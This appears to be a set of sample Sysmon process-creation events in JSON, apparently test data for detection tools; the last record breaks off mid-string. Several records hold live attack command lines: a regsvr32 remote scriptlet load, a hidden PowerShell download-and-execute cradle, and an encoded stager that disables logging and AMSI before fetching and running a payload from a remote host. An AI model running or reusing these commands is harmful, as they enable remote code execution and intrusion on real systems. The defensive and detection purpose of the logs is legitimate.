{
  "Event": {
    "EventData": {
      "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /C \"C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\debug.bat\"",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "49F1AF32-D0E8-59DC-0000-00208C8E0100",
      "LogonId": "0x00018e8c",
      "ParentCommandLine": "\"C:\\Windows\\System32\\sysprep\\sysprep.exe\" ",
      "ParentImage": "C:\\Windows\\System32\\sysprep\\sysprep.exe",
      "ParentProcessGuid": "49F1AF32-D424-59DC-0000-0010D6780B00",
      "ParentProcessId": "1896",
      "ProcessGuid": "49F1AF32-D424-59DC-0000-0010CA7C0B00",
      "ProcessId": "2316",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "62848",
      "Execution": {
        "ProcessID": "1376",
        "ThreadID": "1936"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://192.168.57.2:8080/TGnALEigHGs8');",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-DB3E-5A72-0000-00204F830100",
      "LogonId": "0x0001834f",
      "ParentCommandLine": "\"C:\\Windows\\system32\\regsvr32.exe\"  /s /n /u /i:http://192.168.57.2:8080/TGnALEigHGs8.sct scrobj.dll",
      "ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
      "ParentProcessGuid": "49F1AF32-DF73-5A7A-0000-0010D2E97201",
      "ParentProcessId": "1444",
      "ProcessGuid": "49F1AF32-DF73-5A7A-0000-001096157301",
      "ProcessId": "2020",
      "Product": "Microsoft� Windows� Operating System",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "5075078",
      "Execution": {
        "ProcessID": "1312",
        "ThreadID": "1884"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\SYSTEM32\\cmd.exe /c \"C:\\Program Files\\RawSecTools\\run.bat\"",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "49F1AF32-2111-59C2-0000-00207D0D0700",
      "LogonId": "0x00070d7d",
      "ParentCommandLine": "taskeng.exe {E7BA2A95-1DA0-403A-A4E5-D63650B5FB39} S-1-5-21-2888932017-1170430559-1631822473-1000:GenEric-PC\\Gen Eric:S4U:Highest",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "49F1AF32-2111-59C2-0000-0010C4110700",
      "ParentProcessId": "2940",
      "ProcessGuid": "49F1AF32-2111-59C2-0000-00108C1B0700",
      "ProcessId": "2972",
      "TerminalSessionId": "0",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "969787",
      "Execution": {
        "ProcessID": "1384",
        "ThreadID": "1952"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-20D3-59C2-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-20D7-59C2-0000-001053F40100",
      "ParentProcessId": "1980",
      "ProcessGuid": "49F1AF32-21D2-59C2-0000-00106A171000",
      "ProcessId": "3708",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "1012693",
      "Execution": {
        "ProcessID": "1384",
        "ThreadID": "1952"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-20D3-59C2-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-20D7-59C2-0000-001053F40100",
      "ParentProcessId": "1980",
      "ProcessGuid": "49F1AF32-220E-59C2-0000-00104FB21000",
      "ProcessId": "2960",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "1015643",
      "Execution": {
        "ProcessID": "1384",
        "ThreadID": "1952"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\SYSTEM32\\cmd.exe /c \"C:\\Program Files\\RawSecTools\\run.bat\"",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "49F1AF32-898F-59C1-0000-002052040800",
      "LogonId": "0x00080452",
      "ParentCommandLine": "taskeng.exe {81EF6BFD-73DA-4FDE-BFE0-10687416C339} S-1-5-21-2888932017-1170430559-1631822473-1000:GenEric-PC\\Gen Eric:S4U:Highest",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "49F1AF32-898F-59C1-0000-00101B080800",
      "ParentProcessId": "2572",
      "ProcessGuid": "49F1AF32-898F-59C1-0000-00109C0F0800",
      "ProcessId": "2656",
      "TerminalSessionId": "0",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "855655",
      "Execution": {
        "ProcessID": "1336",
        "ThreadID": "1876"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTA